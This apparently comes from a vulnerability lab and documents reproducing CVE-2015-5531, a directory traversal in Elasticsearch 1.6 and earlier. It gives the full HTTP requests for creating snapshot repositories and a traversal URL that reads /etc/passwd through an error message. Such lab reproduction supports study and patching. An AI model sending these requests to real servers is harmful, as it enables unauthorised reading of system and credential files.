# ElasticSearch Directory Traversal Vulnerability (CVE-2015-5531)

Jre version: openjdk: 8-jre

Elasticsearch version: v1.6.0

Impact version: 1.6.1 or less

## Principle

Reference article

- https://www.exploit-db.com/exploits/38383/
- http://www.freebuf.com/vuls/99942.html

Description:

Elasticsearch 1.5.1 and before, the vulnerability could be triggered without any configuration. After the new version, the configuration file elasticsearch.yml must have `path.repo`, the configuration value is a directory, and the directory must be writable, which is equivalent to limiting the root location of the backup repository. This value is not configured and is not enabled by default.

## Vulnerability recurrence

### 1. Create a new warehouse

```
PUT /_snapshot/test HTTP/1.1
Host: your-ip: 9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test"
    }
}
```

![](1.png)

### 2. Create a snapshot

```
PUT /_snapshot/test2 HTTP/1.1
Host: your-ip: 9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 108

{
    "type": "fs",
    "settings": {
        "location": "/usr/share/elasticsearch/repo/test/snapshot-backdata"
    }
}
```

![](2.png)

### 3. Directory traversal to read arbitrary files

Visit `http://your-ip:9200/_snapshot/test/backdata%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2fetc%2fpasswd`

![](3.png)

As shown above, the file content (after encoding) is included in the error message, and the file can be obtained by decoding it:

![](4.png)